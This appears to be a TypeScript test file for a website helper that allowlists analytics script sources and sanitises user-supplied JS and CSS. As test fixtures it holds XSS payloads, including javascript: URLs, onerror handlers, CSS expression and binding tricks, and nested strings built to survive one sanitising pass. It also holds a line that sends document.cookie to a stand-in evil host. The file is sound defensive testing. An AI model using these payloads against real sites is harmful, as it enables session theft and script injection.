import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { gtagLoaderSrc, isAllowedGtagInline, isAllowedScriptSrc, parseCustomJs, sanitizeCustomCss } from "../../src/helpers/customContentSecurity.ts";

const GA_SNIPPET = `<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC123XYZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-ABC123XYZ');
</script>`;

const GTM_SNIPPET = `<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-NYC1');</script>`;

describe("isAllowedScriptSrc", () => {
  it("allows https gtag and analytics hosts", () => {
    assert.equal(isAllowedScriptSrc("https://www.googletagmanager.com/gtag/js?id=G-ABC123XYZ"), true);
    assert.equal(isAllowedScriptSrc("https://www.google-analytics.com/analytics.js"), true);
  });

  it("denies non-allowlisted and non-https sources", () => {
    assert.equal(isAllowedScriptSrc("https://connect.facebook.net/en_US/fbevents.js"), false);
    assert.equal(isAllowedScriptSrc("https://client.crisp.chat/l.js"), false);
    assert.equal(isAllowedScriptSrc("https://widget.intercom.io/widget/abc"), false);
    assert.equal(isAllowedScriptSrc("http://www.googletagmanager.com/gtag/js?id=G-ABC123XYZ"), false);
    assert.equal(isAllowedScriptSrc("https://www.googletagmanager.com.evil.com/gtag/js"), false);
    assert.equal(isAllowedScriptSrc("https://evil.com/www.googletagmanager.com/gtag/js"), false);
    assert.equal(isAllowedScriptSrc("javascript:alert(1)"), false);
    assert.equal(isAllowedScriptSrc("//www.googletagmanager.com/gtag/js"), false);
    assert.equal(isAllowedScriptSrc("https://user:pass@www.googletagmanager.com/gtag/js"), false);
  });
});

describe("parseCustomJs", () => {
  it("allows the documented GA snippet and copies async/defer only", () => {
    const parsed = parseCustomJs(GA_SNIPPET);
    assert.deepEqual(parsed.externalScripts, [{ src: "https://www.googletagmanager.com/gtag/js?id=G-ABC123XYZ", async: true, defer: false }]);
    assert.deepEqual(parsed.measurementIds, ["G-ABC123XYZ"]);
  });

  it("allows a tight GTM container snippet", () => {
    const parsed = parseCustomJs(GTM_SNIPPET);
    assert.deepEqual(parsed.measurementIds, ["GTM-NYC1"]);
    assert.equal(gtagLoaderSrc("GTM-NYC1"), "https://www.googletagmanager.com/gtm.js?id=GTM-NYC1");
  });

  it("drops unknown inline JS even when a GA id is mentioned", () => {
    const parsed = parseCustomJs(`<script>fetch('https://evil.test/?c='+document.cookie); gtag('config', 'G-ABC123XYZ');</script>`);
    assert.deepEqual(parsed.externalScripts, []);
    assert.deepEqual(parsed.measurementIds, []);
  });

  it("drops event-handler attributes, javascript hrefs, and foreign script hosts", () => {
    const html = `<a href="javascript:alert(1)" onclick="steal()">x</a>
<script src="https://evil.test/x.js" onerror="steal()"></script>
<script src="https://www.googletagmanager.com/gtag/js?id=G-OK1" onclick="steal()" defer></script>`;
    const parsed = parseCustomJs(html);
    assert.deepEqual(parsed.externalScripts, [{ src: "https://www.googletagmanager.com/gtag/js?id=G-OK1", async: false, defer: true }]);
    assert.deepEqual(parsed.measurementIds, ["G-OK1"]);
  });

  it("does not resurrect unsourced inline scripts", () => {
    const parsed = parseCustomJs(`<script>document.body.innerHTML='pwned'</script><img src=x onerror=alert(1)>`);
    assert.deepEqual(parsed, { externalScripts: [], measurementIds: [] });
  });
});

describe("isAllowedGtagInline", () => {
  it("accepts the standard gtag bootstrap", () => {
    assert.equal(isAllowedGtagInline(`window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-ABC123XYZ');`), true);
  });

  it("rejects extra statements", () => {
    assert.equal(isAllowedGtagInline(`gtag('config', 'G-ABC123XYZ'); eval('1')`), false);
  });
});

describe("sanitizeCustomCss", () => {
  it("keeps ordinary theme rules", () => {
    const css = `--accent: #112233; h1 { color: #445566; font-size: 2rem; } .hero { background: url(https://content.churchapps.org/x.jpg); }`;
    assert.equal(sanitizeCustomCss(css), css);
  });

  it("strips style breakout, expression, binding, javascript urls, non-https imports, and HTML", () => {
    const dirty = `color: red; </style><script>alert(1)</script> expression(alert(1)) -moz-binding: url(#x); background: url(javascript:alert(1)); @import url('http://evil.test/x.css'); @import url('//evil.test/x.css'); @import url('https://fonts.googleapis.com/css?family=Roboto'); <img src=x onerror=alert(1)>`;
    const clean = sanitizeCustomCss(dirty);
    assert.equal(clean.includes("</style"), false);
    assert.equal(clean.includes("<script"), false);
    assert.equal(clean.includes("<img"), false);
    assert.equal(/expression\s*\(/i.test(clean), false);
    assert.equal(clean.includes("-moz-binding"), false);
    assert.equal(/url\s*\(\s*javascript/i.test(clean), false);
    assert.equal(clean.includes("http://evil.test"), false);
    assert.equal(clean.includes("//evil.test"), false);
    assert.equal(clean.includes("https://fonts.googleapis.com/css?family=Roboto"), true);
    assert.equal(clean.includes("color: red;"), true);
  });

  it("strips payloads that would reassemble after a single pass", () => {
    const clean = sanitizeCustomCss(`width: expexpression(ression(alert(1)); background: <scr<script>ipt>x; -moz--moz-bindingbinding: url(#x);`);
    assert.equal(/expression\s*\(/i.test(clean), false);
    assert.equal(/<script/i.test(clean), false);
    assert.equal(clean.includes("-moz-binding"), false);
  });

  it("drops @import from hosts CSP style-src does not allow", () => {
    const clean = sanitizeCustomCss(`@import url('https://evil.test/x.css'); @import url('https://fonts.googleapis.com.evil.test/x.css'); @import url('https://user:pass@fonts.googleapis.com/x.css'); color: red;`);
    assert.equal(clean.includes("evil.test"), false);
    assert.equal(clean.includes("user:pass"), false);
    assert.equal(clean.includes("color: red;"), true);
  });

  it("strips IE behavior bindings", () => {
    assert.equal(/behavior\s*:/i.test(sanitizeCustomCss(`behavior: url(evil.htc); color: red;`)), false);
  });
});
